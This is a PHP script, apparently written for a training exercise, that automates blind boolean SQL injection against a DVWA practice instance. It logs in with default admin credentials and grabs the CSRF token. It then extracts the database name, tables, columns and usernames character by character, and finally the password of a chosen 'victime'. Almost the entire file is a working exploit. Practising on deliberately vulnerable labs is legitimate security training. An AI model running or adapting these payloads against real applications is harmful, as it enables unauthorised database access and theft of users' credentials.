<?php
// import dependencies
require 'vendor/autoload.php';
use GuzzleHttp\Client;
use Symfony\Component\DomCrawler\Crawler;

function consolelog($arg)
{
    echo '===> ' . $arg . PHP_EOL;
}

function get_query_result($client, $sqli_blind_url, $query, ...$args)
{
    try {
        //code...

        $formatted_query = sprintf($query, ...$args);
        $response = $client->request('GET', $sqli_blind_url, [
            'query' => [
                'id' => $formatted_query,
                'Submit' => 'Submit',
            ],
        ]);
        $html = $response->getBody()->getContents();

        // extract CSRF token from response HTML
        $crawler = new Crawler($html);
        return str_contains($crawler->filter('pre')->text(), 'exists');
        // return str_contains($crawler->filter('pre')->text(), "exists");
    } catch (\Throwable $th) {
        return false;
    }
}

// define base URL
$BASE_URL = 'https://dvwa-g1-12.s.freebs.ovh/';

// create new HTTP client
$client = new GuzzleHttp\Client([
    'base_uri' => $BASE_URL,
    'cookies' => true,
    'verify' => false,
]);

// perform login request
$response = $client->request('GET', '/login.php');
$html = $response->getBody()->getContents();

// extract CSRF token from response HTML
$crawler = new Crawler($html);
$csrf_token = $crawler->filter('input[name="user_token"]')->attr('value');

// perform login POST request
$response = $client->request('POST', '/login.php', [
    'form_params' => [
        'username' => 'admin',
        'password' => 'password',
        'Login' => 'Login',
        'user_token' => $csrf_token,
    ],
]);

// print response data
// echo $response->getStatusCode();

$sqli_blind_url = "$BASE_URL/vulnerabilities/sqli_blind";

$db_lenght = 0;
$query = "1' AND LENGTH(DATABASE()) = %s #";
for ($i = 0; $i < 10; $i++) {
    if (get_query_result($client, $sqli_blind_url, $query, $i)) {
        consolelog("la taille de la base de donnée est : $i");
        $db_lenght = $i;
        break;
    }
}

$query = "1' AND SUBSTRING(DATABASE(), %s, 1) = '%s' #";
$ascii_lower = 'abcdefghijklmnopqrstuvwxyz';
$dbname = '';
for ($i = 1; $i <= $db_lenght; $i++) {
    foreach (str_split($ascii_lower) as $character) {
        if (get_query_result($client, $sqli_blind_url, $query, $i, $character)) {
            $dbname = $dbname . $character;
            break;
        }
    }
}
consolelog("le nom de la base de donnée est : $dbname");

$query = "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_type='base table' AND table_schema='%s')='%s'#";
$n_tables = 0;
for ($i = 1; $i < 10; $i++) {
    if (get_query_result($client, $sqli_blind_url, $query, $dbname, $i)) {
        consolelog("il y a $i tables dans $dbname\n");
        $n_tables = $i;
        break;
    }
}

consolelog('brute forcing des noms des tables en cours ...');

$query = "1' AND SUBSTR((SELECT table_name from information_schema.tables WHERE table_type='base table' AND table_schema='%s' %s LIMIT 1),%s,1)='%s'#";

$found_tables = array_fill(0, $n_tables, []);
$completion = '';
for ($i = 0; $i < $n_tables; $i++) {
    for ($j = 1; $j < 10; $j++) {
        foreach (range('a', 'z') as $c) {
            if (get_query_result($client, $sqli_blind_url, $query, $dbname, $completion, $j, $c)) {
                array_push($found_tables[$i], $c);
                break;
            }
        }
    }
    consolelog(implode('', $found_tables[$i]));
    $completion .= " AND table_name <> '" . implode('', $found_tables[$i]) . "'";
}

$target_table = readline('tappez le nom de la table à bruteforce: ');
$query = "1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='%s')='%s'#";

$n_columns = 0;
for ($i = 1; $i < 10; $i++) {
    if (get_query_result($client, $sqli_blind_url, sprintf($query, $target_table, $i))) {
        consolelog("la table $target_table possède $i colonnes");
        $n_columns = $i;
        break;
    }
}

$query = "1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='%s' LIMIT %s, 1), %s, 1)='%s'#";

$found_columns = array_fill(0, $n_columns, []);

for ($i = 0; $i < $n_columns; $i++) {
    for ($j = 1; $j < 15; $j++) {
        foreach (str_split($ascii_lower . '_') as $c) {
            if (get_query_result($client, $sqli_blind_url, sprintf($query, $target_table, $i, $j, $c))) {
                $found_columns[$i][] = $c;
                break;
            }
        }
    }
    consolelog(implode('', $found_columns[$i]));
}

$users_column = readline('tappez le nom de la colone des usernames: ');
$passwords_column = readline('tappez le nom de la colone des passwords: ');

$query = "1' AND SUBSTR((SELECT %s FROM %s LIMIT %s, 1),%s,1)='%s' #";

$found_users = array_fill(0, 15, []);

for ($i = 0; $i < 10; $i++) {
    for ($j = 1; $j < 12; $j++) {
        foreach (range('a', 'z') as $c) {
            if (get_query_result($client, $sqli_blind_url, $query, $users_column, $target_table, $i, $j, $c)) {
                $found_users[$i][] = $c;
                break;
            }
        }
    }
    consolelog(implode($found_users[$i]));
}

$username = readline("tappez le nom de votre victime: ");

$query = "1' AND LENGTH((SELECT %s FROM %s WHERE %s='%s'))=%s #";
$pwd_length = 0;
for ($i = 0; $i < 100; $i++) {
    if (get_query_result($client, $sqli_blind_url, $query, $passwords_column, $target_table, $users_column, $username, $i)) {
        $pwd_length = $i;
        consolelog("la taille du mot de passe est: $i");
    }
}

$query = "1' AND SUBSTR((SELECT %s FROM %s WHERE %s='%s' LIMIT 1), %s, 1)='%s' #";
$password = [];
for ($j = 1; $j <= $pwd_length; $j++) {
    foreach (str_split('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') as $c) {
        if (get_query_result($client, $sqli_blind_url, $query, $passwords_column, $target_table, $users_column, $username, $j, $c)) {
            $password[] = $c;
            break;
        }
    }
}
consolelog("le mot de passe est: " . implode("", $password) );

